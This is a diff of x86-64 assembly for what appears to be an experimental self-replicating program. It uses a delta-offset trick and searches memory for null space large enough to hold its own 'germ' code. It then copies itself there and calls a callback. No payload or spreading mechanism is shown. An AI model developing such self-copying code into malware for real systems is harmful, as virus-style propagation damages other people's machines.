@@ -22,10 +22,11 @@ _start:
     ; prolog - stack frame creation
     push        rbp
     mov         rbp, rsp
-    sub         rsp, 0x10
+    sub         rsp, 0x18
     ; stack frame:
     ;   - 0x8  start address
     ;   - 0x10 cb address
+    ;   - 0x18 copy address
 
     call        delta
 delta:
@@ -38,16 +39,19 @@ delta:
     _print      0x8, exe_str, exe_str_len
 
     call        search
+    mov         [rbp-0x18], rax
 
-;    call        copy
+    mov         rdi, [rbp-0x18]
+    call        copy
 
     ; print completion message
-;    _print      0x8, comp_str, comp_str_len
+    _print      0x8, comp_str, comp_str_len
 
     ; make call to the callback
-    mov         rax, [rbp-0x10]     ; cb address
-    mov         rsi, reach          ; arg1: length
-    call        rax
+    mov         rdi, [rbp-0x18]     ; arg0: address
+    mov         rsi, germ_len       ; arg1: length
+    call        [rbp-0x10]          ; cb address
+
 
 exit:
     ; epilog - stack frame cleanup
@@ -77,17 +81,35 @@ print:
 ;       now begin to search for enough free space
 ; in:
 ; returns:
-;       rdi-address found
+;       rax-address found
 ;
 search:
-.find_null:
     xor         rax, rax
     mov         rdi, [rbp-0x8]      ; start address
     add         rdi, germ_len       ; move pointer to beyond end
+.find_null:
     xor         rcx, rcx
     add         rcx, reach          ; area in which we can replicate
-    repne       scasw               ; repeat scasw as long as [rdi] does not equal rax
+    repne       scasw               ; repeat scasw as long as [rdi] is not NULL (rax)
 
+    ; exit if we out of reach (rcx zero)
+    test        rcx, rcx
+    jz          .exit
+
+    ; temporarily store the copy start address
+    mov         r12, rdi
+
+.find_space:
+    xor         rcx, rcx
+    add         rcx, germ_len
+    repe        scasw               ; repeat scasw as long as [rdi] is NULL (rax)
+
+    ; if rcx is not zero we do not have enough space
+    test        rcx, rcx
+    jnz         .find_null
+
+    ; return the copy start address
+    mov         rax, r12
 .exit:
     ret
 
@@ -95,12 +117,12 @@ search:
 ; copy:
 ;
 ; in:
+;       rdi-start address
 ; returns:
 ;
 copy:
-    mov         rdi, rbp
-    add         rdi, germ_len
-    mov         rdi, germ_len
+    mov         rsi, [rbp-0x8]      ; germ start address
+    mov         rcx, germ_len
     rep         movsb
     ret
 
